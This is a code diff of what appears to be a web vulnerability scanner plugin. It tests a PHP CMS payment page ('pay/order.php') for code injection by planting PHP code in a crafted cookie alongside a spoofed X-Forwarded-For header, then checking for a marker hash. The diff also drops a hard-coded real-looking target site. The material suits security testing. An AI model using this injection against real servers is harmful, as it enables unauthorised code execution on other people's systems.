@@ -19,24 +19,25 @@ def audit(arg):
     cookiekey = None
     payload = 'pay/order.php'
     url = arg + payload
-    code, head, res, errcode, _ = curl.curl('"%s"' % url) 
+    code, head, res, errcode, _ = curl.curl('"%s"' % url)
     m = re.findall(u'Set-Cookie[\s\S]+?;',head)
     if m :
         for cookie in m:
             if 'siteid' in cookie:
                 cookie_pre = cookie
                 cookiekey =  cookie_pre[12:-9] +'060b8081c32887f8'
-                exp(cookiekey,url)
-                break;
+                return exp(cookiekey,url,arg)
 
-def exp(cookiekey,url):
-    payload = cookiekey + ' = 1%3b@print(md5(base64_decode(MzYwd2Vic2Nhbg)))' 
+
+def exp(cookiekey,url,host):
+    payload = cookiekey + ' = 1%3b@print(md5(base64_decode(MzYwd2Vic2Nhbg)))'
     xip = 'X-Forwarded-For: 2.2.2.2'
     code, head, res, errcode, _ = curl.curl('-b "%s" -H "%s" "%s"' % (payload,xip,url))
     if 'ed1e83f8d8d90aa943e4add2ce6a4cbf' in res:
         security_hole(url)
-        
 
-if __name__ == '__main__':
+
+
+        return host
+if __name__== '__main__':
     from dummy import *
-    audit(assign('dircms', 'http://www.0394zk.cn/')[1])
